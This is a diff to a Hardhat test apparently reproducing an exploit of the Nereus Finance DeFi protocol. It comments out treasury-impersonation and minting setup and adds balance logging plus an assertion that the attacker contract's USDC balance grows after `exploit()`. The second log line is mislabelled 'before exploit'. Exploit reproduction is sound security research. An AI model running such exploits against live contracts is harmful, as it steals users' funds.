@@ -1,3 +1,4 @@
+import { expect } from 'chai';
 import { Contract, Signer } from 'ethers';
 import { ethers } from 'hardhat';
 import { getAbi } from '../utils/abi';
@@ -30,7 +31,7 @@ describe('Nereus Finance Exploit', async () => {
     // always gets repaid when testing the unfinished exploit.
     //
     // Impersonate the reserve treasury of the contract to send ourselves tokens
-    const impersonated = await ethers.getImpersonatedSigner(
+    /*const impersonated = await ethers.getImpersonatedSigner(
       '0xb7887fed5e2f9dc1a66fbb65f76ba3731d82341a',
     );
 
@@ -45,14 +46,19 @@ describe('Nereus Finance Exploit', async () => {
 
     await usdcContract
       .connect(attacker)
-      .mint(attackerContract.address, ethers.utils.parseUnits('100000000', 6));
+      .mint(attackerContract.address, ethers.utils.parseUnits('100000000', 6));*/
   });
 
   it('Exploits successfully', async () => {
     // Run our exploit
+    const beforeBalance = await usdcContract.balanceOf(attackerContract.address);
+    console.log(`[+] USDC Balance before exploit: ${beforeBalance / 1e6}`);
 
-    console.log(await attackerContract.test());
     await attackerContract.exploit();
-    console.log(await attackerContract.test());
+
+    const afterBalance = await usdcContract.balanceOf(attackerContract.address);
+    console.log(`[+] USDC Balance before exploit: ${afterBalance / 1e6}`);
+
+    expect(beforeBalance).to.be.lt(afterBalance);
   });
 });
